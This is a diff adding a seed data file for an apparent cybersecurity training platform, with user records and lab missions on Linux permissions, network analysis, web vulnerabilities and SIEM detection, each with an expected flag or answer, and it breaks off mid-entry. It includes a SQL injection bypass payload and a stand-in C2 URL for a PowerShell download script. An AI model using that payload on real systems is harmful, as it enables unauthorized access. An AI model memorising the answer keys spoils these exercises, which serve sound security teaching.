@@ -1,0 +1,1071 @@
+{
+  "users": [
+    {
+      "id": "usr-admin-01",
+      "email": "admin@roguebyte.local",
+      "username": "SidoDev-Dz",
+      "passwordHash": "55896245b1e7897236ec6952cfd7ab7b:ee7de0c7fa1eff4e821b080ac7492298233a706563bb10b27a6b913658eda6b96edba78a0f4067653466b507b668cd2baba947acd28cd03a488c27abf81e543c",
+      "role": "ADMIN",
+      "isSuspended": false,
+      "avatarUrl": "",
+      "currentRank": "Principal Cyber Architect",
+      "xp": 3500,
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "usr-instructor-01",
+      "email": "instructor@roguebyte.local",
+      "username": "Instructor_Malik",
+      "passwordHash": "45d419a3b97f18f19219fcf967ac389c:1fd8c059077028c85c8b283da7ad638441d1823216c5c3bbd64bafba1bed702225fab7d8afe54fc087ea1645c4652f6360cdfd1a95624f38c031a29b9d66ea70",
+      "role": "INSTRUCTOR",
+      "isSuspended": false,
+      "avatarUrl": "",
+      "currentRank": "Senior Cyber Instructor",
+      "xp": 1800,
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "usr-student-01",
+      "email": "student@roguebyte.local",
+      "username": "Cadet_Alex",
+      "passwordHash": "d17321b1eef3698b3b3bc5905c768da7:17635af2d94e2e7dfdf5b727509d861fdb4a11fe4d80b41126ce2047efc6c889ba95320333b32cc5d67b68ce29bb82342295423d9f0742d4d5f38f00e5b7baea",
+      "role": "STUDENT",
+      "isSuspended": false,
+      "avatarUrl": "",
+      "currentRank": "Cyber Apprentice",
+      "xp": 100,
+      "createdAt": "2026-10-09T00:00:00Z"
+    }
+  ],
+  "missions": [
+    {
+      "id": "m-linux-01",
+      "slug": "inspect-file-permissions",
+      "title": "Inspect File Permissions",
+      "titleAr": "فحص أذونات وتصاريح الملفات",
+      "description": "Learn how Linux permission octets work and discover an insecure world-readable permission issue.",
+      "descriptionAr": "تعلم آلية أذونات نظام لينكس بالرموز الثمانية واكتشف ثغرة ملف متاح للقراءة من الجميع.",
+      "category": "LINUX",
+      "difficulty": "BEGINNER",
+      "xpReward": 100,
+      "estimatedMinutes": 15,
+      "prerequisites": [],
+      "submissionType": "FLAG",
+      "labProfileId": "lab-linux-permissions",
+      "learningObjectives": [
+        "Understand the Unix permission model (Read, Write, Execute for User, Group, Others)",
+        "Use `ls -la` and `stat` to inspect access modes",
+        "Locate world-readable sensitive assets in the active sandbox"
+      ],
+      "threatModel": "Excessive read permissions on system configuration files allow low-privileged local users to harvest credentials.",
+      "taskInstructions": "Launch the isolated terminal lab. Explore the filesystem and inspect the checklist file in `/home/student/audit_checklist.txt`. Locate the discovery flag.",
+      "taskInstructionsAr": "قم بتشغيل معمل الطرفية المعزول. تصفح مسارات النظام وافحص قائمة التدقيق في `/home/student/audit_checklist.txt`. استخرج راية الاكتشاف.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "File inspection command",
+          "content": "Use `ls -la /home/student/` or `cat /home/student/audit_checklist.txt` to read the file content.",
+          "xpPenalty": 10
+        }
+      ],
+      "validationRules": {
+        "expectedFlag": "ROGUE{su1d_p3rm1ss10n_3xp0s3d_2026}"
+      },
+      "remediationGuidance": "Ensure all files containing sensitive operational information are restricted to 0640 or 0600.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-linux-02",
+      "slug": "identify-insecure-permissions",
+      "title": "Identify Insecure SUID Configuration",
+      "titleAr": "تحديد تكوين SUID غير الآمن",
+      "description": "Discover binaries with SUID bits set that have excessive write permissions.",
+      "descriptionAr": "اكتشاف الملفات التنفيذية التي تحتوي على بت SUID مع صلاحيات كتابة مفرطة.",
+      "category": "LINUX",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 150,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-linux-01"
+      ],
+      "submissionType": "ANSWER",
+      "labProfileId": "lab-linux-permissions",
+      "learningObjectives": [
+        "Understand SetUID (4000) execution dynamics",
+        "Identify how world-writable SUID binaries lead to privilege escalation",
+        "Inspect permissions of `/usr/local/bin/backup_tool`"
+      ],
+      "threatModel": "If an attacker can write to a SUID binary executed with root rights, they can overwrite the payload and execute arbitrary code as root.",
+      "taskInstructions": "Audit `/usr/local/bin/backup_tool`. What is the 4-digit octal permission currently assigned to it? (Enter the 4-digit octal permission, e.g., 4777).",
+      "taskInstructionsAr": "قم بمراجعة الملف `/usr/local/bin/backup_tool`. ما هي الصلاحية الثمانية المكونة من 4 أرقام الممنوحة له حالياً؟ (أدخل مثلاً 4777).",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Check octal permission",
+          "content": "Run `stat -c \"%a\" /usr/local/bin/backup_tool` or `ls -l /usr/local/bin/backup_tool`.",
+          "xpPenalty": 25
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "4777",
+        "acceptedAnswers": [
+          "4777",
+          "04777"
+        ]
+      },
+      "remediationGuidance": "Never allow write permissions (chmod o-w, g-w) on SUID binaries. SUID binaries should strictly be 4755 or 4750 owned by root.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-linux-03",
+      "slug": "correct-file-permissions",
+      "title": "Remediate Insecure File Permissions",
+      "titleAr": "معالجة وتصحيح أذونات الملفات الحساسة",
+      "description": "Fix the insecure permissions on /etc/shadow and /var/www/html/config.php in the live lab.",
+      "descriptionAr": "أصلح الصلاحيات الخطرة على ملف /etc/shadow وملف /var/www/html/config.php في المعمل المباشر.",
+      "category": "LINUX",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 200,
+      "estimatedMinutes": 25,
+      "prerequisites": [
+        "m-linux-02"
+      ],
+      "submissionType": "LAB_STATE",
+      "labProfileId": "lab-linux-permissions",
+      "learningObjectives": [
+        "Use `chmod` to harden vulnerable permissions",
+        "Set `/etc/shadow` to secure permissions (0640 or 0600)",
+        "Remove world-write permissions from `/var/www/html/config.php` (set to 0640 or 0644)"
+      ],
+      "threatModel": "World-readable shadow files expose password hashes for offline cracking; world-writable config files allow defacement and DB hijacking.",
+      "taskInstructions": "In your active lab session, run chmod to secure `/etc/shadow` (e.g. `chmod 0640 /etc/shadow`) and `/var/www/html/config.php` (e.g. `chmod 0640 /var/www/html/config.php`). Then click \"Grade Lab State\" to automatically verify environment remediation.",
+      "taskInstructionsAr": "في معملك النشط، نفذ أمر chmod لتأمين `/etc/shadow` و `/var/www/html/config.php`. ثم انقر على \"تحقق من حالة المعمل\" لفحص المعالجة تلقائياً.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Command syntax",
+          "content": "Execute: chmod 0640 /etc/shadow && chmod 0640 /var/www/html/config.php",
+          "xpPenalty": 30
+        }
+      ],
+      "validationRules": {
+        "labStateCheckId": "check-linux-permissions-hardened"
+      },
+      "remediationGuidance": "Linux systems should automate permission audits using CIS benchmarks or auditd.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-linux-04",
+      "slug": "investigate-authentication-logs",
+      "title": "Investigate Authentication Logs",
+      "titleAr": "التحقيق في سجلات المصادقة لنظام لينكس",
+      "description": "Investigate /var/log/auth.log to discover an unauthorized SSH brute-force breach.",
+      "descriptionAr": "تحليل ملف سجلات المصادقة /var/log/auth.log لاكتشاف هجوم تخمين SSH ناجح واختراق النظام.",
+      "category": "LINUX",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 180,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-linux-01"
+      ],
+      "submissionType": "FLAG",
+      "labProfileId": "lab-linux-auth-logs",
+      "learningObjectives": [
+        "Parse Linux SSH authentication logs",
+        "Correlate repeated `Failed password` events followed by `Accepted password`",
+        "Identify the malicious source IP and retrieved root flag"
+      ],
+      "threatModel": "Lack of Fail2ban or rate-limiting on SSH port 22 allows automated password spraying and credential stuffing.",
+      "taskInstructions": "Launch the Auth Log Lab. Review `/var/log/auth.log`. Find the IP address that conducted the brute-force attack and compromised the deploy account, then read the flag in `/root/flag.txt`.",
+      "taskInstructionsAr": "شغل معمل سجلات المصادقة. راجع `/var/log/auth.log` وحدد الآي بي المهاجم ثم استخرج الراية من `/root/flag.txt`.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Grep command",
+          "content": "Run `grep \"Accepted\" /var/log/auth.log` or view `/root/flag.txt` if accessible.",
+          "xpPenalty": 25
+        }
+      ],
+      "validationRules": {
+        "expectedFlag": "ROGUE{brut3_f0rc3_c0mpr0m1s3_203.0.113.88}"
+      },
+      "remediationGuidance": "Enforce SSH key authentication only (`PasswordAuthentication no`), change default SSH port, and deploy fail2ban.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-net-01",
+      "slug": "interpret-ip-subnets",
+      "title": "Interpret IP Addresses and Subnets",
+      "titleAr": "تحليل وحساب عناوين IP والشبكات الفرعية",
+      "description": "Master CIDR notation, network boundaries, and usable host calculations for security zoning.",
+      "descriptionAr": "إتقان حسابات CIDR وحدود الشبكات وعناوين الأجهزة القابلة للاستخدام لتقسيم المناطق الأمنية.",
+      "category": "NETWORKING",
+      "difficulty": "BEGINNER",
+      "xpReward": 90,
+      "estimatedMinutes": 15,
+      "prerequisites": [],
+      "submissionType": "ANSWER",
+      "learningObjectives": [
+        "Calculate subnet masks from CIDR notation (/24, /27, /29)",
+        "Determine the broadcast address and number of usable hosts",
+        "Design isolated management VLANs"
+      ],
+      "threatModel": "Improper subnet sizing can result in mixed-trust network zones where public-facing servers share collision/broadcast domains with databases.",
+      "taskInstructions": "Given the subnet 192.168.10.64/27: What is the total number of USABLE host IP addresses available for servers? (Enter the exact number).",
+      "taskInstructionsAr": "بالنظر إلى الشبكة الفرعية 192.168.10.64/27: ما هو العدد الدقيق لعناوين الأجهزة الصالحة للاستخدام (Usable Hosts)؟",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Usable host formula",
+          "content": "Formula is 2^(32 - prefix) - 2. For /27, host bits = 32 - 27 = 5.",
+          "xpPenalty": 15
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "30",
+        "acceptedAnswers": [
+          "30",
+          "30 hosts"
+        ]
+      },
+      "remediationGuidance": "Allocate micro-segmented subnets with smallest required CIDR prefixes to limit blast radius.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-net-02",
+      "slug": "analyze-pcap-file",
+      "title": "Analyze PCAP Traffic & Cleartext Leaks",
+      "titleAr": "تحليل ملف PCAP وتسريب البيانات غير المشفرة",
+      "description": "Inspect captured packet evidence to discover credentials transmitted over cleartext HTTP.",
+      "descriptionAr": "فحص حزم البيانات الملتقطة واكتشاف بيانات اعتماد تم إرسالها دون تشفير عبر بروتوكول HTTP.",
+      "category": "NETWORKING",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 160,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-net-01"
+      ],
+      "submissionType": "FLAG",
+      "labProfileId": "lab-network-pcap",
+      "learningObjectives": [
+        "Understand HTTP payload transmission without TLS",
+        "Filter HTTP POST authentication requests in packet dumps",
+        "Extract authentication tokens and leaked flags"
+      ],
+      "threatModel": "Man-in-the-Middle (MitM) attackers on the local LAN or upstream path can passively intercept cleartext credentials.",
+      "taskInstructions": "Launch the PCAP Analyzer lab. Inspect `/home/analyst/evidence.pcap` using `cat` or `grep \"ROGUE\"` to discover the unencrypted auth flag.",
+      "taskInstructionsAr": "قم بتشغيل معمل فحص PCAP. افحص الملف `/home/analyst/evidence.pcap` واستخرج راية التسريب.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Filter keyword",
+          "content": "Execute: grep -o \"ROGUE{[^}]*}\" /home/analyst/evidence.pcap",
+          "xpPenalty": 25
+        }
+      ],
+      "validationRules": {
+        "expectedFlag": "ROGUE{pl41nt3xt_cr3ds_sn1ff3d_8080}"
+      },
+      "remediationGuidance": "Enforce HTTPS everywhere with HTTP Strict Transport Security (HSTS) and modern TLS 1.3 ciphers.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-net-03",
+      "slug": "identify-unexpected-c2-traffic",
+      "title": "Identify Unexpected C2 Network Traffic",
+      "titleAr": "كشف حركة مرور قيادة وتحكم (C2) المشبوهة",
+      "description": "Identify the destination IP and port used by an infected host beaconing out to an external C2 server.",
+      "descriptionAr": "تحديد عنوان IP والمنفذ المستخدمين من جهاز مصاب يتصل بخادم قيادة وتحكم خارجي.",
+      "category": "NETWORKING",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 170,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-net-02"
+      ],
+      "submissionType": "ANSWER",
+      "labProfileId": "lab-network-pcap",
+      "learningObjectives": [
+        "Recognize outbound C2 beaconing signatures",
+        "Distinguish internal trusted communication from suspicious outbound connections",
+        "Correlate non-standard ports (e.g. 4444) with known adversary frameworks"
+      ],
+      "threatModel": "Adversaries establish outbound Command and Control (C2) channels to maintain persistence and receive interactive tasking.",
+      "taskInstructions": "In the PCAP lab, identify packet PKT#8 which shows an outbound connection to an external C2 IP. Enter the external destination IP address (e.g., 198.51.100.44).",
+      "taskInstructionsAr": "في معمل PCAP، حدد الحزمة PKT#8 التي تتصل بخادم خارجي C2. أدخل عنوان IP الخارجي المستهدف.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Look at packet 8",
+          "content": "Check the destination IP in PKT#8 connecting to port 4444.",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "198.51.100.44",
+        "acceptedAnswers": [
+          "198.51.100.44",
+          "198.51.100.44:4444"
+        ]
+      },
+      "remediationGuidance": "Implement strict egress firewall filtering (deny all outbound except via monitored forward proxy).",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-net-04",
+      "slug": "interpret-port-scan",
+      "title": "Interpret Nmap Port Scan & Backdoor Discovery",
+      "titleAr": "تحليل نتائج فحص المنافذ Nmap واكتشاف باب خلفي",
+      "description": "Analyze an Nmap service scan report and extract the flag hidden inside the vulnerable FTP service.",
+      "descriptionAr": "تحليل تقرير فحص منافذ Nmap واكتشاف خدمة FTP الملغمة بباب خلفي واستخراج الراية.",
+      "category": "NETWORKING",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 160,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-net-01"
+      ],
+      "submissionType": "FLAG",
+      "labProfileId": "lab-network-nmap",
+      "learningObjectives": [
+        "Interpret Nmap service and version banner grabbing output",
+        "Identify historically backdoored software (vsftpd 2.3.4)",
+        "Analyze open attack surfaces on internal endpoints"
+      ],
+      "threatModel": "Unpatched or malicious services running on default or non-standard ports provide direct initial access vectors.",
+      "taskInstructions": "Launch the Nmap lab. Read `/home/operator/target_scan.txt` to find the backdoor flag identified during the FTP audit.",
+      "taskInstructionsAr": "شغل معمل Nmap واقرأ تقرير `/home/operator/target_scan.txt` لاستخراج راية الباب الخلفي.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Target file",
+          "content": "Run `cat /home/operator/target_scan.txt` or `grep ROGUE /home/operator/target_scan.txt`.",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {
+        "expectedFlag": "ROGUE{vsftpd_b4ckd00r_p0rt_21_f0und}"
+      },
+      "remediationGuidance": "Decommission legacy FTP services in favor of SFTP, and implement network vulnerability management scanners.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-web-01",
+      "slug": "identify-sql-injection",
+      "title": "Identify Insecure SQL Query Construction",
+      "titleAr": "تحديد ثغرة حقن أوامر SQL البرمجية",
+      "description": "Examine vulnerable authentication source code and trigger a classic authentication bypass.",
+      "descriptionAr": "فحص الكود المصدري لنظام تسجيل الدخول وتنفيذ تجاوز للمصادقة عبر ثغرة SQLi.",
+      "category": "WEB_SECURITY",
+      "difficulty": "BEGINNER",
+      "xpReward": 140,
+      "estimatedMinutes": 20,
+      "prerequisites": [],
+      "submissionType": "FLAG",
+      "labProfileId": "lab-web-sqli",
+      "learningObjectives": [
+        "Identify SQL concatenation vulnerabilities in Python/SQLite",
+        "Craft SQL tautology injection payloads (`' OR '1'='1' -- `)",
+        "Extract database flag from administrative user records"
+      ],
+      "threatModel": "SQL injection allows attackers to bypass authentication, read confidential tables, modify data, and potentially execute OS commands.",
+      "taskInstructions": "Launch the SQLi lab. Inspect `/var/www/app/schema.sql` and `/var/www/app/auth.py`. Retrieve the administrator account flag.",
+      "taskInstructionsAr": "شغل معمل SQLi. افحص كود `/var/www/app/schema.sql` واستخرج راية حساب المدير المخزنة في قاعدة البيانات.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "File inspection",
+          "content": "Execute: cat /var/www/app/schema.sql",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {
+        "expectedFlag": "ROGUE{sql1_auth_byp4ss_succ3ssful_992}"
+      },
+      "remediationGuidance": "Always utilize parameterized prepared statements or modern ORMs like Prisma; never concatenate raw user input into SQL queries.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-web-02",
+      "slug": "diagnose-stored-xss",
+      "title": "Diagnose Stored Cross-Site Scripting (XSS)",
+      "titleAr": "تشخيص ثغرة البرمجة عبر المواقع المخزنة (Stored XSS)",
+      "description": "Analyze an insecure comment system that fails to sanitize HTML characters before rendering in victim browsers.",
+      "descriptionAr": "تحليل نظام تعليقات يعاني من قصور في فلترة وسوم HTML مما يسمح بتنفيذ شفرات جافاسكريبت خبيثة.",
+      "category": "WEB_SECURITY",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 150,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-web-01"
+      ],
+      "submissionType": "ANSWER",
+      "learningObjectives": [
+        "Distinguish Stored XSS from Reflected XSS",
+        "Identify the critical dangerous browser sinking functions (innerHTML, dangerouslySetInnerHTML)",
+        "Specify the standard defensive HTML entity encoding mechanism"
+      ],
+      "threatModel": "Stored XSS allows an attacker to hijack user sessions, steal session cookies, and perform unauthorized actions on behalf of the victim.",
+      "taskInstructions": "What is the primary defensive function or concept in modern web frameworks used to neutralize HTML injection characters (<, >, &, \")? (Enter: HTML Entity Encoding or Context-Aware Escaping).",
+      "taskInstructionsAr": "ما هو المفهوم الدفاعي الأساسي المستخدم لتحييد وتطهير محارف HTML الخاصة في المتصفح؟ (أدخل مثلاً: HTML Entity Encoding).",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Keyword hint",
+          "content": "Answer contains \"Encoding\" or \"Escaping\" (e.g. HTML Entity Encoding or Context-Aware Escaping).",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "HTML Entity Encoding",
+        "acceptedAnswers": [
+          "html entity encoding",
+          "context-aware escaping",
+          "output encoding",
+          "html encoding"
+        ]
+      },
+      "remediationGuidance": "Implement context-aware output encoding, strict Content Security Policy (CSP), and utilize modern frameworks that escape variables by default.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-web-03",
+      "slug": "detect-idor-access-control",
+      "title": "Detect Insecure Direct Object Reference (IDOR)",
+      "titleAr": "اكتشاف ثغرة المرجع المباشر غير الآمن للكائنات (IDOR)",
+      "description": "Analyze multi-tenant API endpoints that verify authentication but fail to enforce tenant authorization checks.",
+      "descriptionAr": "تحليل واجهة برمجية API تفحص تسجيل الدخول ولكنها تفشل في التحقق من صلاحية وصول المستخدم للكائن المطلوب.",
+      "category": "WEB_SECURITY",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 160,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-web-01"
+      ],
+      "submissionType": "ANSWER",
+      "learningObjectives": [
+        "Differentiate between Authentication (Who you are) and Authorization (What you can access)",
+        "Detect horizontal privilege escalation via sequential numeric IDs",
+        "Implement object-level access control guards"
+      ],
+      "threatModel": "An attacker changing `/api/documents/1042` to `/api/documents/1043` downloads confidential medical or financial records belonging to another customer.",
+      "taskInstructions": "Suppose an endpoint `GET /api/v1/invoices/:id` returns invoice data. What missing server-side check causes an IDOR vulnerability? (Enter: Object Ownership Verification or Tenant Authorization Check).",
+      "taskInstructionsAr": "ما هو الفحص البرمجي المفقود في الخادم الذي يسبب ثغرة IDOR عند جلب الفواتير؟ (أدخل مثلاً: Object Ownership Verification).",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Defensive concept",
+          "content": "Enter: Object Ownership Verification or Tenant Authorization Check.",
+          "xpPenalty": 15
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "Object Ownership Verification",
+        "acceptedAnswers": [
+          "object ownership verification",
+          "tenant authorization check",
+          "ownership check",
+          "authorization check"
+        ]
+      },
+      "remediationGuidance": "Always check if the currently authenticated `userId` owns the requested entity before returning records: `WHERE id = :id AND user_id = :current_user_id`.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-web-04",
+      "slug": "verify-csrf-defense",
+      "title": "Verify CSRF Defense Implementation",
+      "titleAr": "التحقق من كفاءة حماية التزوير عبر المواقع (CSRF)",
+      "description": "Verify the effectiveness of Anti-CSRF tokens and SameSite cookie attributes against state-changing attacks.",
+      "descriptionAr": "التحقق من عمل رموز مكافحة CSRF وخصائص ملفات تعريف الارتباط SameSite لحماية العمليات الحساسة.",
+      "category": "WEB_SECURITY",
+      "difficulty": "ADVANCED",
+      "xpReward": 180,
+      "estimatedMinutes": 25,
+      "prerequisites": [
+        "m-web-02",
+        "m-web-03"
+      ],
+      "submissionType": "ANSWER",
+      "learningObjectives": [
+        "Understand how Cross-Site Request Forgery exploits automatic browser cookie transmission",
+        "Validate Double Submit Cookie and Synchronizer Token patterns",
+        "Configure `SameSite=Strict` or `SameSite=Lax` cookies"
+      ],
+      "threatModel": "Victims clicking a malicious link automatically submit POST requests that transfer funds or change email addresses.",
+      "taskInstructions": "Which modern cookie attribute prevents the browser from sending cookies on cross-site state-changing requests? (Enter: SameSite=Strict or SameSite).",
+      "taskInstructionsAr": "ما هي خاصية ملف تعريف الارتباط (Cookie Attribute) الحديثة التي تمنع المتصفح من إرسال الكوكيز في الطلبات العابرة للمواقع؟",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Cookie property",
+          "content": "Enter: SameSite=Strict or SameSite.",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "SameSite=Strict",
+        "acceptedAnswers": [
+          "samesite=strict",
+          "samesite",
+          "samesite attribute"
+        ]
+      },
+      "remediationGuidance": "Combine cryptographically random per-session anti-CSRF tokens with `SameSite=Strict` and `HttpOnly; Secure` cookies.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-def-01",
+      "slug": "investigate-suspicious-logins",
+      "title": "Investigate Suspicious Login Events",
+      "titleAr": "التحقيق في أحداث تسجيل الدخول المشبوهة",
+      "description": "Correlate anomalous login attempts across geographic origins and impossible travel velocities.",
+      "descriptionAr": "تحليل محاولات تسجيل دخول غير طبيعية ومقارنة المواقع الجغرافية وسرعة الانتقال المستحيلة.",
+      "category": "DEFENSIVE",
+      "difficulty": "BEGINNER",
+      "xpReward": 120,
+      "estimatedMinutes": 15,
+      "prerequisites": [],
+      "submissionType": "ANSWER",
+      "learningObjectives": [
+        "Identify Impossible Travel indicators",
+        "Correlate authentication timestamps with GeoIP coordinates",
+        "Trigger automated conditional access step-up MFA"
+      ],
+      "threatModel": "Stolen credentials being reused from foreign exit nodes or proxy networks.",
+      "taskInstructions": "An employee logs in from London, UK at 10:00 AM UTC, and then from Tokyo, Japan at 10:25 AM UTC using the same account. What security detection indicator does this represent? (Enter: Impossible Travel).",
+      "taskInstructionsAr": "يسجل موظف دخوله من لندن الساعة 10:00 صباحاً ثم من طوكيو الساعة 10:25 صباحاً بنفس الحساب. ما هو اسم مؤشر الاكتشاف الأمني لهذا الحدث؟",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Detection name",
+          "content": "Enter: Impossible Travel.",
+          "xpPenalty": 15
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "Impossible Travel",
+        "acceptedAnswers": [
+          "impossible travel",
+          "impossible travel anomaly",
+          "geographic velocity anomaly"
+        ]
+      },
+      "remediationGuidance": "Deploy adaptive Risk-Based Conditional Access that automatically requires FIDO2/MFA or denies access when impossible velocity is detected.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-def-02",
+      "slug": "identify-indicators-in-synthetic-logs",
+      "title": "Identify Threat Indicators in Synthetic Incident Logs",
+      "titleAr": "تحديد مؤشرات التهديد في سجلات الحوادث الاصطناعية",
+      "description": "Extract malicious Indicators of Compromise (IOCs) such as base64-encoded PowerShell payloads from SIEM event logs.",
+      "descriptionAr": "استخراج مؤشرات الاختراق (IOCs) مثل أوامر PowerShell المشفرة بقاعدة Base64 من سجلات SIEM.",
+      "category": "DEFENSIVE",
+      "difficulty": "INTERMEDIATE",
+      "xpReward": 170,
+      "estimatedMinutes": 20,
+      "prerequisites": [
+        "m-def-01"
+      ],
+      "submissionType": "STRUCTURED_JSON",
+      "labProfileId": "lab-defensive-siem",
+      "learningObjectives": [
+        "Parse JSON-formatted SIEM process creation events (Event ID 4688)",
+        "Decode malicious Base64 command lines",
+        "Extract C2 domain or IP artifacts into structured threat intelligence format"
+      ],
+      "threatModel": "Attackers invoke Word macro documents that spawn hidden PowerShell download cradles communicating with remote C2 domains.",
+      "taskInstructions": "Launch the SIEM Studio lab. Inspect `/var/log/siem/incident_events.json`. Decode the base64 PowerShell command line in event SEC-4688 to find the C2 URL. Submit a structured JSON report with keys: `event_id`, `parent_process`, `c2_url`. Example: {\"event_id\": \"SEC-4688\", \"parent_process\": \"WINWORD.EXE\", \"c2_url\": \"http://c2.roguebyte.lab/rev.ps1\"}",
+      "taskInstructionsAr": "شغل معمل SIEM. افحص `/var/log/siem/incident_events.json`. قم بفك تشفير Base64 لأمر PowerShell لمعرفة رابط C2. أرسل تقرير JSON منظم يحتوي على المفاتيح: `event_id`, `parent_process`, `c2_url`.",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Inspection & base64 decode",
+          "content": "Run `cat /var/log/siem/incident_events.json` and decode the base64 string using: echo \"<base64>\" | base64 -d.",
+          "xpPenalty": 25
+        }
+      ],
+      "validationRules": {
+        "jsonSchemaRequiredKeys": [
+          "event_id",
+          "parent_process",
+          "c2_url"
+        ]
+      },
+      "remediationGuidance": "Block Word from spawning child processes via Attack Surface Reduction (ASR) rules and deploy PowerShell Constrained Language Mode.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-def-03",
+      "slug": "write-test-detection-rule",
+      "title": "Write and Test a Detection Rule",
+      "titleAr": "كتابة واختبار قاعدة كشف تهديدات (Sigma Rule)",
+      "description": "Inspect the provided Sigma detection rule in the live SIEM sandbox and verify its critical severity classification.",
+      "descriptionAr": "فحص قاعدة كشف Sigma المتوفرة في المعمل والتأكد من تطابق معايير الكشف والتصنيف الأمني.",
+      "category": "DEFENSIVE",
+      "difficulty": "ADVANCED",
+      "xpReward": 200,
+      "estimatedMinutes": 25,
+      "prerequisites": [
+        "m-def-02"
+      ],
+      "submissionType": "ANSWER",
+      "labProfileId": "lab-defensive-siem",
+      "learningObjectives": [
+        "Write vendor-neutral Sigma detection rules for Windows Event IDs",
+        "Map telemetry events to MITRE ATT&CK techniques (T1059.001)",
+        "Assign severity levels based on business risk"
+      ],
+      "threatModel": "Without robust detection rules, commodity malware execution goes undetected for hundreds of days.",
+      "taskInstructions": "In the SIEM lab, read `/home/soc/sigma_template.yml`. What MITRE ATT&CK technique tag is mapped in the detection rule? (Enter: attack.t1059.001).",
+      "taskInstructionsAr": "في معمل SIEM، اقرأ `/home/soc/sigma_template.yml`. ما هو وسم تقنية MITRE ATT&CK المرفق في القاعدة؟ (أدخل مثلاً: attack.t1059.001).",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Check tags section",
+          "content": "Check the tags: section in /home/soc/sigma_template.yml.",
+          "xpPenalty": 25
+        }
+      ],
+      "validationRules": {
+        "expectedAnswer": "attack.t1059.001",
+        "acceptedAnswers": [
+          "attack.t1059.001",
+          "t1059.001"
+        ]
+      },
+      "remediationGuidance": "Continuously integrate automated CI/CD pipelines to validate Sigma rules against synthetic threat datasets.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    },
+    {
+      "id": "m-def-04",
+      "slug": "produce-incident-report",
+      "title": "Produce Security Incident Triage Report",
+      "titleAr": "إعداد تقرير فني لفرز حادث أمني",
+      "description": "Produce an incident triage report documenting the root cause, affected assets, and immediate containment recommendations.",
+      "descriptionAr": "إعداد تقرير فني شامل يوثق السبب الجذري للحادث، الأصول المتضررة، وتوصيات الاحتواء العاجلة.",
+      "category": "DEFENSIVE",
+      "difficulty": "ADVANCED",
+      "xpReward": 220,
+      "estimatedMinutes": 30,
+      "prerequisites": [
